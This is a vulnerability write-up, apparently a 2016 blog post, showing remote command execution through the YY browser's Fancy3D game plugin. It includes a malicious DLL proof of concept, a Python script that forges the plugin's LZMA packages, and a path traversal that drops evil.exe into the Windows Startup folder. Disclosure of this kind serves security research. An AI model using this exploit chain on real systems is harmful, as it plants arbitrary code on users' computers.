title: "[浏览器安全系列四] Fancy3D引擎（YY浏览器）远程命令执行"
date: 2016-10-15 16:58:50
tags: ["安全", "浏览器安全"]

---

案例链接：http://www.wooyun.org/bugs/wooyun-2016-0221080

这是浏览器安全系列的最后一篇文章（就目前情况而言）了，静待乌云归来。

## 免责声明

本博客提供的部分文章思路可能带有攻击性，仅供安全研究与教学之用，风险自负!

## 前言

在研究YY浏览器的默认游戏助手插件时，在代码里面找到一个游戏的名字：jzwl，于是在YY的游戏中心搜索了一下，找到了下面这个页面：

```
http://udblogin.duowan.com/login.do?online&report_ver=new&showtools=0&webyygame&pro=webyygame&rso=FROM_SCTG&rso_desc=%E5%B8%82%E5%9C%BA%E6%8E%A8%E5%B9%BF&ref=gw/entergame&ref_desc=%E5%AE%98%E7%BD%91%2f%E8%BF%9B%E5%85%A5%E6%B8%B8%E6%88%8F&game=JZWL&server=s6
```

点开这个页面的时候，我电脑上的腾讯安全管家弹出了下载文件的提示，仔细一看，我擦，自动下载了这么多文件下来！于是我觉得可以研究研究这个东西。
![](http://ww2.sinaimg.cn/large/7184df6bgw1f4xgo3kp46j20mb0htn3y.jpg)

发现页面中有这样的一段代码：

```html
<div class="flash">
  <object id="fancy3d" type="application/fancy-npruntime-fancy3d-plugin" width="100%" height="198">
    <param name="game" value="jzwl">
    <param name="nprver" value="0.0.2.17">
    <param name="ocxver" value="0.0.2.17">     
    <param name="liburl" value="http://loader.52xiyou.zsgl.ate.cn/jzwl/loader/loaderUpdater.71f24efc47252dee7ca07eb571bd6f50.dll">     
    <param name="libmd5" value="71f24efc47252dee7ca07eb571bd6f50">     
    <param name="unsafelib" value="allow">     
    <param name="param1" value="cmdline=uid:1576442523|skey:6|platform:duowan|sign:7115344fa13ccca8950cfea0484437ce|type:web">
    <param name="param2" value="client_root_url=http://res.jzwl.52xiyou.com/client/"> 
    <param name="param3" value="ip_port=[121.46.21.176,121.46.21.176,121.46.21.176,121.46.21.176]|[8092]">    
    <param name="param5" value="loader_root_url=http://res.jzwl.52xiyou.com/loader/">     
    <param name="param6" value="loader_ver_name=loader.ver">     
    <param name="param7" value="loader_catalog_name=loader_catalog.txt"> 
    <param name="param8" value="loader_name=loaderjz.dll">
  </object>
</div>
```

我擦！这个好像在哪里见过的：http://wooyun.org/bugs/wooyun-2016-0172781 我们开始分析吧！

## 0x00 这个插件是哪里来的？
YY浏览器启动的时候会检查注册表中是否已经安装有Fancy3D游戏引擎这个NPAPI插件，具体路径如下。如果不存在，则会自动静悄悄地帮用户安装上。

```
HKEY_CURRENT_USER\Software\MozillaPlugins\@fancyguo.com/FancyGame,version=1.0.0.1
```

![](http://ww2.sinaimg.cn/large/7184df6bgw1f4xg9lwxk8j20ru07cwi6.jpg)

![](http://ww1.sinaimg.cn/large/7184df6bgw1f4xgbxgu0rj20qe04itaj.jpg)

## 0x01 插件功能分析

`libcurl`和`libcmd5`这两个参数在 http://wooyun.org/bugs/wooyun-2016-0172781 已经分析过，这里更简单，连域名白名单限制都没有做，直接修改成为自己的域名都会请求，一开始我以为是可以直接搞定的。但实验过后发现，自己写的dll按照规则放进去之后并没有加载到进程中。进一步查看信息，发现360浏览器那个洞里出现的游戏提供方好像是同一家公司，看样子是做了数字签名，没什么好方法，先放一边。

里面还有几个参数，看上去也是会下载文件，把`<param name="param5" value="loader_root_url=http://a.com/loader/">`改成自己本地的地址（注：我在Hosts文件里做了`127.0.0.1 a.com`映射）看看它都会请求下载哪些东西。测试过后，发现过程如下：

1. 下载loader\_root\_url + loader\_ver\_name，即这个文件：http://res.jzwl.52xiyou.com/loader/loader.ver ，其内容为`2016-06-02`
2. 下载loader\_root\_url + 2016-06-02/loader\_catalog.txt，即：http://res.jzwl.52xiyou.com/loader/2016-06-02/loader_catalog.txt ， 其内容如下：

	```
	curl.exe.lzma||3b0c063789066f74667efc13db00e9cc||247772||f4edf7cab0d6a404b77eb816c996831c||506048
	jztr.exe.lzma||c5dbe14ad37375371cb79261b848bcc8||69086||339068e9b3286cb30e100c398ea632f1||154816
	flash.ocx.lzma||b2a9e2cdb422b3a71558ad9b6acc4ec8||1701337||8afc17155ed5ab60b7c52d7f553d579c||3866528
	loading.swf.lzma||a77c04de83da48dcbb6b15c9028829a7||961202||5f52ea04bc871804c0c059a82053894c||950321
	loaderjz.dll.lzma||4a51f304098ccebcecdf238ff3736d60||350535||2f22bb87e00681d858e3bd6013843231||804496
	```


3. 下载上面的文件，并执行加载游戏的一些操作。通过procexp.exe查看相应YY浏览器的NPAPI的进程，发现其动态加载的dll中，果然有`loaderjz.dll`这个文件。

    目录结构如下：
    ```
    │───poc.html
    │
    └───loader
        │   loader.ver
        └───2016-06-02
                curl.exe.lzma
                flash.ocx.lzma
                jztr.exe.lzma
                loaderjz.dll.lzma
                loader_catalog.txt
                loading.swf.lzma
    ```

## 0x02 分析文件格式

```bash
$ binwalk curl.exe.lzma

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
42            0x2A            LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: 506048 bytes
```

观察每个文件，发现它们都有一个不定长的头部信息，然后是`LZMA:24`算法压缩的数据包，Google之后猜测是使用这里的工具开发的：http://www.7-zip.org/sdk.html

接下来分析一下头部信息都是些什么东西。注：这里用的是小端规则。
![](http://ww4.sinaimg.cn/large/7184df6bgw1f4xie83ou5j20hp030jt7.jpg)

* 00 - 03 字节：29 00 00 00 = 0x29 = 41，正好是上面binwalk分析出来的头部长度。
* 04 - 07 字节：B3 C7 03 00 = 0x03C7B3 = 247731，是loader_catalog.txt文件中 247772 - 41 得到的，而247772是curl.exe.lzma文件的大小。最终，通过`binwalk -e`解压开文件，发现就是加了头部信息之前的文件的大小 + 1
* 08 - 11 字节：C0 B8 07 00 = 0x07B8C0 = 506048，应该就是解压后文件的大小
* 12 - 13 字节：09 00 = 9，刚好就是字符串`curl.exe`的长度，注意结尾的`\0`
* 14 - 15 字节：11 00，暂时没猜到
* 16 - 31 字节：00000000000000000000000000000000
* 32 - 40 字节：6375726C2E65786500 = `curl.exe`

## 0x03 劫持loaderjz.dll.lzma这个文件实现远程命令执行

首先，自己实现一个dll文件，在其`DllMain`入口函数的时候中启动一下计算器就好，代码如下：

```cpp
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		WinExec("calc", 0);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

编译成Release版本，改名，使用 http://www.7-zip.org/sdk.html 这里下载得到的lzma.exe压缩一下文件
```bash
E:\lzma\bin>lzma.exe e loaderjz.dll loaderjz.dll.lzma -d24

LZMA 16.02 : Igor Pavlov : Public domain : 2016-05-21

Input size:  12288 (0 MiB)
Output size: 5748 (0 MiB)
```

接着使用脚本gen.py（见测试代码）生成带有头部信息的文件：
```bash
$ python gen.py loaderjz.dll
output.lzma||3a94912118bc172065d643e1aa847b0d||5794||9bc1ee40c622a0d7a1f96a6c9119bbe6||12288
```
将生成的output.lzma覆盖`loaderjz.dll.lzma`，并将`loader_catalog.txt`中的值修改成上述命令的输出，使用YY浏览器访问测试页面。就可以执行任意程序了。

![](http://ww1.sinaimg.cn/large/7184df6bgw1f4y97swvl3g20qu0h979t.gif)


## 0x04 任意路径写入漏洞导致RCE

在测试的过程中，我还发现头部信息中的文件名可以使用`..`跳转到上一级目录中，也就是说我们可以利用这个点来将一个可执行文件写入到用户的启动目录中。在生成头部信息时，只需要使用文件名：`..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe`，YY浏览器在下载这个生成的lzma文件之后就会自动将这个文件写入到启动目录中。

![](http://ww1.sinaimg.cn/large/7184df6bgw1f4y9vhta2qj20lu06rabw.jpg)

### 测试代码

gen.py

```python
import struct
import os
import sys
import hashlib

inputFileName = sys.argv[1]
#fileName = "..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe"
fileName = "loaderjz.dll"
fileNameLength = len(fileName) + 1
lzmaFile = inputFileName + ".lzma"
outputFile = "output.lzma"

def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

with open(outputFile, "wb") as f:
    f.write(struct.pack('I', 32 + fileNameLength))
    f.write(struct.pack('I', os.path.getsize(lzmaFile) + 1))
    f.write(struct.pack('I', os.path.getsize(inputFileName)))
    f.write(struct.pack('H', fileNameLength))
    f.write(struct.pack('H', 0x11))
    f.write('\x00' * 16)
    f.write(fileName)
    f.write('\x00' * 2)
    with open(lzmaFile, "rb") as lzmaF:
        f.write(lzmaF.read())

print outputFile + "||" + md5(outputFile) + "||" + str(os.path.getsize(outputFile)) +\
        "||" + md5(inputFileName) + "||" + str(os.path.getsize(inputFileName))
```